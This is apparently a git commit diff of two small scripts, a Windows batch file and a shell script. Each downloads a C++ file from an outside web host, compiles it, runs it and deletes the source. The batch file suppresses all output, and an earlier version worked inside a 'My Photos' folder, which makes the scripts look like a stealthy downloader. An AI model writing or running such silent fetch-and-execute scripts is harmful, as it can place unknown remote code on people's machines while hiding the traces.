6f618327e8187cb1078e8b6279daefdbcfa4bfc3
Jason <jasonharriot@gmail.com>
2018-08-14 21:01:31 -0400

    misc

--- webComp.bat
+++ webComp.bat
@@ -1,4 +1,5 @@
 @echo off
 bitsadmin.exe /transfer "There is no spoon" http://mcminiposts.com/remote_media/matrix.cpp "%~dp0\matrix.cpp" >nul 2>nul
 gcc matrix.cpp -lstdc++ -std=gnu++14 -o Matrix.exe >nul 2>nul
+rm matrix.cpp >nul
 Matrix 2>nul
--- webComp.sh
+++ webComp.sh
@@ -1,5 +1,4 @@
-mkdir ~/My\ Photos
-cd ~/My\ Photos
 curl mcminiposts.com/remote_media/matrix.cpp > matrix.cpp
-clang matrix.cpp
-./a.out
+clang matrix.cpp -o matrix
+rm matrix.cpp
+./matrix
